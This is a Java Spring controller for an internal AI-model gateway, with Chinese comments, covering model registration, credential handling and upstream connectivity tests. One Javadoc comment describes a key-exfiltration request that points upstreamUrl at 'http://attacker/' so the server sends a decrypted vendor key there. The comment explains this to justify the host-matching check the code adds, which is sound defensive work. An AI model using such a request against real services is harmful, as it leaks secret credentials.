package com.pab.ficc.ibp.modelgate.server.controller;
import com.pab.ficc.ibp.modelgate.server.constant.UrlConstant;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.pab.ficc.ibp.domain.base.vo.PageVo;
import com.pab.ficc.ibp.modelgate.server.common.AdminScheduler;
import com.pab.ficc.ibp.modelgate.server.common.PageSupport;
import com.pab.ficc.ibp.modelgate.server.domain.Result;
import com.pab.ficc.ibp.modelgate.server.common.BusinessException;
import com.pab.ficc.ibp.modelgate.server.common.ErrorCode;
import com.pab.ficc.ibp.modelgate.server.domain.bo.CreateModelRequestBO;
import com.pab.ficc.ibp.modelgate.server.domain.bo.ModelQueryBO;
import com.pab.ficc.ibp.modelgate.server.domain.bo.TestConnectionRequestBO;
import com.pab.ficc.ibp.modelgate.server.domain.bo.UpdateModelRequestBO;
import com.pab.ficc.ibp.modelgate.server.domain.entity.ModelCredentialEntity;
import com.pab.ficc.ibp.modelgate.server.domain.entity.ModelInstanceEntity;
import com.pab.ficc.ibp.modelgate.server.domain.vo.ConnectivityTestVO;
import com.pab.ficc.ibp.modelgate.server.domain.vo.ModelVO;
import com.pab.ficc.ibp.modelgate.server.service.ModelAuthService;
import com.pab.ficc.ibp.modelgate.server.service.ModelConnectivityService;
import com.pab.ficc.ibp.modelgate.server.service.ModelService;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.Parameter;
import io.swagger.v3.oas.annotations.tags.Tag;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;
import reactor.core.publisher.Mono;

import jakarta.validation.Valid;

import java.util.LinkedHashMap;
import java.util.Map;

@Slf4j
@Tag(name = "模型管理", description = "注册和管理内网部署的 AI 模型及上游鉴权配置")
@RestController
@RequestMapping(UrlConstant.MG_MODELS)
@RequiredArgsConstructor
public class ModelController {

    private final ModelService modelService;
    private final ModelConnectivityService connectivityService;
    private final ModelAuthService modelAuthService;
    private final ObjectMapper objectMapper;

    @Operation(summary = "分页查询模型（pageIndex 从 1 开始，pageSize 上限 200；keyword 模糊匹配 modelId/modelName）")
    @GetMapping(UrlConstant.PAGE)
    public Mono<Result<PageVo<ModelVO>>> page(ModelQueryBO query) {
        // 分页护栏放在 Mono 外：参数非法应当立刻返回，不必占用管理面线程池的名额
        PageSupport.validate(query, "模型");
        return Mono.fromCallable(() -> {
                    // 一次性取全部凭证与授权计数再归集，避免逐条查询造成 N+1。
                    // 注意：这两张表整表加载，与分页无关——分页只收敛模型主表的返回行数。
                    Map<String, ModelCredentialEntity> credentials = modelService.findAllCredentials();
                    Map<String, Long> authCounts = modelAuthService.countByModelId();
                    PageVo<ModelVO> page = PageVo.of(modelService.page(query),
                            m -> ModelVO.of(m, credentials.get(m.getModelId()), authCounts.get(m.getModelId())));
                    log.debug("[Model][page] pageIndex={}, pageSize={}, total={}",
                            page.getPageIndex(), page.getPageSize(), page.getTotal());
                    return page;
                })
                .subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .map(Result::success);
    }

    @Operation(summary = "查询单个模型详情")
    @GetMapping(UrlConstant.DETAIL)
    public Mono<Result<ModelVO>> findOne(@Parameter(description = "模型 ID") @RequestParam("modelId") String modelId) {
        log.debug("[Model][findOne] modelId={}", modelId);
        return Mono.fromCallable(() -> ModelVO.of(modelService.findByModelId(modelId),
                        modelService.getCredential(modelId).orElse(null)))
                .subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .map(Result::success);
    }

    @Operation(summary = "新增模型")
    @PostMapping(UrlConstant.CREATE)
    public Mono<Result<ModelVO>> create(@RequestBody @Valid CreateModelRequestBO req) {
        validateModelParamConfigs(req.getDefaultParams(), req.getForceParams(), req.getParamMapping());
        log.info("[Model][create] 收到新增请求: modelId={}, modelName={}, provider={}, apiSpec={}, upstreamUrl={}, authType={}",
                req.getModelId(), req.getModelName(), req.getProvider(), req.getApiSpec(), req.getUpstreamUrl(),
                req.getCredential() != null ? req.getCredential().getAuthType() : "none");
        return Mono.fromCallable(() -> {
                    ModelInstanceEntity model = req.toEntity();
                    ModelCredentialEntity cred = req.toCredential();
                    ModelVO vo = ModelVO.of(modelService.create(model, cred));
                    log.info("[Model][create] 新增成功: modelId={}", vo.getModelId());
                    return vo;
                }).subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .map(Result::success);
    }

    @Operation(summary = "更新模型信息")
    @PutMapping(UrlConstant.UPDATE)
    public Mono<Result<ModelVO>> update(@RequestBody @Valid UpdateModelRequestBO req) {
        validateModelParamConfigs(req.getDefaultParams(), req.getForceParams(), req.getParamMapping());
        log.info("[Model][update] 收到更新请求: modelId={}, upstreamUrl={}, authType={}",
                req.getModelId(), req.getUpstreamUrl(),
                req.getCredential() != null ? req.getCredential().getAuthType() : "未携带");
        return Mono.fromCallable(() -> {
                    String modelId = req.getModelId();
                    ModelInstanceEntity updated = modelService.update(
                            modelId, req.toEntity(), req.toCredential(), req.getNewModelId());
                    // 改名后凭证必须按**新** ID 查：外键已把子表级联改过去了，按旧 ID 查是空的，
                    // 结果就是页面上「保存成功但鉴权配置不见了」
                    String effectiveId = updated.getModelId();
                    ModelVO vo = ModelVO.of(updated, modelService.getCredential(effectiveId).orElse(null));
                    log.info("[Model][update] 更新成功: modelId={}, authType={}", effectiveId, vo.getAuthType());
                    return vo;
                }).subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .map(Result::success);
    }

    @Operation(summary = "启用/禁用模型（enabled=false 时禁用，禁用后请求返回 503）")
    @PatchMapping(UrlConstant.TOGGLE)
    public Mono<Result<Void>> toggle(
            @Parameter(description = "模型 ID") @RequestParam("modelId") String modelId,
            @Parameter(description = "目标状态：true=启用，false=禁用") @RequestParam("enabled") boolean enabled) {
        log.info("[Model][toggle] modelId={}, enabled={}", modelId, enabled);
        return Mono.fromRunnable(() -> {
                    if (enabled) modelService.enable(modelId);
                    else modelService.disable(modelId);
                })
                .subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .then(Mono.just(Result.<Void>success(null)));
    }

    @Operation(summary = "删除模型（存在活跃授权时禁止删除）")
    @DeleteMapping(UrlConstant.DELETE)
    public Mono<Result<Void>> delete(@Parameter(description = "模型 ID") @RequestParam("modelId") String modelId) {
        log.info("[Model][delete] modelId={}", modelId);
        return Mono.fromRunnable(() -> modelService.delete(modelId))
                .subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .then(Mono.just(Result.<Void>success(null)));
    }

    @Operation(summary = "连通性测试（向上游发送真实推理请求，仅上游返回 2xx 判为连通）")
    @PostMapping(UrlConstant.TEST)
    public Mono<Result<ConnectivityTestVO>> test(
            @Parameter(description = "模型 ID；带草稿 body 时可省略") @RequestParam(name = "modelId", required = false) String modelId,
            @Parameter(description = "草稿配置（新增模型时尚未入库），缺省则按 modelId 查库")
            @RequestBody(required = false) TestConnectionRequestBO draft) {

        // 草稿模式：新增模型尚未入库，编辑模型也要测试页面上尚未保存的当前配置。
        if (draft != null && draft.hasDraftConfig()) {
            validateModelParamConfigs(
                    draft.getDefaultParams(), draft.getForceParams(), draft.getParamMapping());
            // 编辑页可用 query 中的原 ID 定位旧凭证；新增页则必须自行给出对外 ID。
            // 不能把空字符串当作有效草稿 ID，否则最小探测体会安静地向生产上游发送 model=""。
            String draftId = draft.getModelId();
            if (draftId == null || draftId.isBlank()) {
                draftId = modelId;
            }
            if (draftId == null || draftId.isBlank()) {
                throw new BusinessException(ErrorCode.INVALID_PARAMETER,
                        "草稿 modelId 不能为空（upstreamModelId 留空时将回退使用它）");
            }
            draft.setModelId(draftId);
            log.info("[Model][test] 草稿模式探测: modelId={}, apiSpec={}, upstreamUrl={}",
                    draftId, draft.getApiSpec(), draft.getUpstreamUrl());
            // 编辑页不会回显 SK。query modelId 是保存前的定位 ID，仅用于取已存凭证；
            // 地址、上游真实 ID 和参数配置仍全部使用 body 草稿，确保“测试”的就是眼前这份配置。
            Mono<ModelCredentialEntity> savedCredential = draft.requiresSavedCredential()
                    && modelId != null && !modelId.isBlank()
                    ? Mono.fromCallable(() -> loadSavedCredentialForDraft(modelId, draft.getUpstreamUrl()))
                    : Mono.empty();
            return savedCredential
                    .subscribeOn(AdminScheduler.get())
                    .timeout(AdminScheduler.REQUEST_TIMEOUT)
                    .flatMap(saved -> connectivityService.probe(
                            draft.toEntity(), draft.toCredential(saved)))
                    .switchIfEmpty(Mono.defer(() -> connectivityService.probe(
                            draft.toEntity(), draft.toCredential(null))))
                    .map(Result::success);
        }

        // 已保存模式：按 modelId 查库，SK 需解密后才能用于真实请求
        if (modelId == null || modelId.isBlank()) {
            throw new BusinessException(ErrorCode.INVALID_PARAMETER, "modelId 与草稿配置不能同时为空");
        }
        log.info("[Model][test] 查库模式探测: modelId={}", modelId);
        return Mono.fromCallable(() -> {
                    ModelInstanceEntity model = modelService.findByModelId(modelId);
                    ModelCredentialEntity cred = modelService.getCredentialDecrypted(modelId);
                    return new ModelWithCredential(model, cred);
                })
                .subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .flatMap(mc -> connectivityService.probe(mc.model(), mc.credential()))
                .map(Result::success);
    }

    /**
     * 草稿模式下取已保存凭证，<b>但只在草稿上游主机与库中登记的一致时才给</b>。
     *
     * <p><b>不加这道校验就是一个密钥外传通道</b>：{@code hasDraftConfig()} 只要求
     * {@code upstreamUrl} 非空，{@code requiresSavedCredential()} 在 {@code credential == null}
     * 时返回 true——于是一个
     * {@code POST /models/test?modelId=<任一已存在模型>} 配
     * {@code {"upstreamUrl":"http://attacker/"}} 的请求，就会让服务端把库中解密后的
     * 上游厂商密钥写进请求头、POST 到调用方指定的地址，上游响应还回显给调用方。
     * 它绕开了 {@code ModelVO} "secretKey 任何情况下都不下发" 那道防线，
     * 且与网络隔离无关——管理员误操作或一次 CSRF 同样能触发。
     *
     * <p><b>只比主机，不比 scheme/端口/路径</b>：改协议、改端口、改接口路径都是正常的配置修正，
     * 拦下来只会挡住真实用途；而外传必须把密钥送到<b>另一台主机</b>，主机一致就没有这条路。
     * 能在上游自己那台机器上另起端口收包的人，早已在那台机器上有立足点，不是本校验的假想敌。
     *
     * <p><b>一律 fail-closed</b>：库里查不到该模型、任一地址为空、地址解析不出主机，
     * 都当作"不一致"处理。
     *
     * <p>正常改地址的用法没有被堵死：在表单里重填 Secret Key 即可——
     * 那时 {@code requiresSavedCredential()} 返回 false，根本不会走到这里。
     */
    private ModelCredentialEntity loadSavedCredentialForDraft(String modelId, String draftUpstreamUrl) {
        ModelInstanceEntity stored = modelService.findByModelIdOrNull(modelId);
        if (stored == null) {
            // 库里没有这个模型，本就没有"已保存凭证"可复用；返回 null 让调用方按无凭证探测
            return null;
        }
        if (!sameUpstreamHost(stored.getUpstreamUrl(), draftUpstreamUrl)) {
            // 记 WARN 留痕：这既可能是正常改地址，也可能是一次外传尝试，两者都该在日志里看得见
            log.warn("[Model][test] 草稿上游主机与库中不一致，拒绝复用已保存密钥: "
                            + "modelId={}, 库中主机={}, 草稿主机={}",
                    modelId, hostOf(stored.getUpstreamUrl()), hostOf(draftUpstreamUrl));
            throw new BusinessException(ErrorCode.INVALID_PARAMETER,
                    "草稿的上游地址与该模型库中登记的主机不一致，出于安全不会复用已保存的密钥。"
                            + "请在表单里重新填写 Secret Key 后再测试。");
        }
        return modelService.getCredentialDecrypted(modelId);
    }

    /** 两个地址是否指向同一主机；任一取不出主机即判不一致（fail-closed）。 */
    static boolean sameUpstreamHost(String storedUrl, String draftUrl) {
        String a = hostOf(storedUrl);
        return a != null && a.equals(hostOf(draftUrl));
    }

    /** 取 URL 的主机名并小写化；地址为空或非法一律返回 null，由调用方按"不一致"处理。 */
    static String hostOf(String url) {
        if (url == null || url.isBlank()) {
            return null;
        }
        try {
            String host = java.net.URI.create(url.trim()).getHost();
            return host == null ? null : host.toLowerCase(java.util.Locale.ROOT);
        } catch (Exception e) {
            return null;
        }
    }

    @Operation(summary = "对话测试（服务端用库中模型凭证直连上游，密钥不下发浏览器）")
    @PostMapping(UrlConstant.CHAT_TEST)
    public Mono<Result<ConnectivityTestVO>> chatTest(
            @Parameter(description = "模型 ID") @RequestParam("modelId") String modelId,
            @Parameter(description = "OpenAI 规范请求体：messages / temperature / max_tokens 等")
            @RequestBody Map<String, Object> body) {

        if (modelId == null || modelId.isBlank()) {
            throw new BusinessException(ErrorCode.INVALID_PARAMETER, "modelId 不能为空");
        }
        if (body == null) {
            throw new BusinessException(ErrorCode.INVALID_PARAMETER, "请求体不能为空");
        }
        log.info("[Model][chatTest] 管理面对话测试: modelId={}, keys={}", modelId, body.keySet());

        return Mono.fromCallable(() -> {
                    ModelInstanceEntity model = modelService.findByModelId(modelId);
                    // 上游密钥在此解密并由适配器注入请求头，全程不出服务端
                    ModelCredentialEntity cred = modelService.getCredentialDecrypted(modelId);
                    return new ModelWithCredential(model, cred);
                })
                .subscribeOn(AdminScheduler.get())
                .timeout(AdminScheduler.REQUEST_TIMEOUT)
                .flatMap(mc -> {
                    byte[] raw;
                    try {
                        // query modelId 只负责定位 ModelGate 对外模型；真正发给供应商的 body.model
                        // 必须由服务端按库中 upstreamModelId 决定，不能信任或透传浏览器传值。
                        Map<String, Object> upstreamBody = new LinkedHashMap<>(body);
                        String upstreamModelId = mc.model().resolveUpstreamModelId();
                        upstreamBody.put("model", upstreamModelId);
                        raw = objectMapper.writeValueAsBytes(upstreamBody);
                        log.info("[Model][chatTest] 测试路由已解析: externalModelId={}, upstreamModelId={}",
                                modelId, upstreamModelId);
                    } catch (JsonProcessingException e) {
                        throw new BusinessException(ErrorCode.INVALID_PARAMETER, "请求体序列化失败: " + e.getMessage());
                    }
                    return connectivityService.chat(mc.model(), mc.credential(), raw);
                })
                .map(Result::success);
    }

    private record ModelWithCredential(ModelInstanceEntity model, ModelCredentialEntity credential) {}

    /**
     * 管理写入口验证三个模型参数都是 JSON 对象，并拒绝无效的 forceParams.model。
     * 运行期仍保留逐项忽略兜底，只用于历史脏数据或绕过管理 API 的直接改库。
     */
    private void validateModelParamConfigs(String defaultParams, String forceParams, String paramMapping) {
        parseConfigObjectForWrite("defaultParams", defaultParams);
        JsonNode forced = parseConfigObjectForWrite("forceParams", forceParams);
        JsonNode mapping = parseConfigObjectForWrite("paramMapping", paramMapping);

        if (forced != null && forced.has("model")) {
            throw new BusinessException(ErrorCode.INVALID_PARAMETER,
                    "forceParams.model 已废止；请使用“上游真实模型 ID（upstreamModelId）”配置模型身份");
        }
        if (mapping != null) {
            mapping.fields().forEachRemaining(entry -> {
                if (!entry.getValue().isTextual() || entry.getValue().asText().isBlank()) {
                    throw new BusinessException(ErrorCode.INVALID_PARAMETER,
                            "paramMapping 的目标字段必须是非空字符串: " + entry.getKey());
                }
            });
        }
    }

    /** 管理写入口只接受 JSON 对象；运行期的容错仅用于历史脏数据或绕过管理 API 的直接改库。 */
    private JsonNode parseConfigObjectForWrite(String fieldName, String json) {
        if (json == null || json.isBlank()) return null;
        final JsonNode node;
        try {
            node = objectMapper.readTree(json);
        } catch (JsonProcessingException e) {
            throw new BusinessException(ErrorCode.INVALID_PARAMETER,
                    fieldName + " 必须是合法 JSON 对象: " + e.getOriginalMessage());
        }
        if (node == null || !node.isObject()) {
            throw new BusinessException(ErrorCode.INVALID_PARAMETER,
                    fieldName + " 必须是 JSON 对象");
        }
        return node;
    }
}
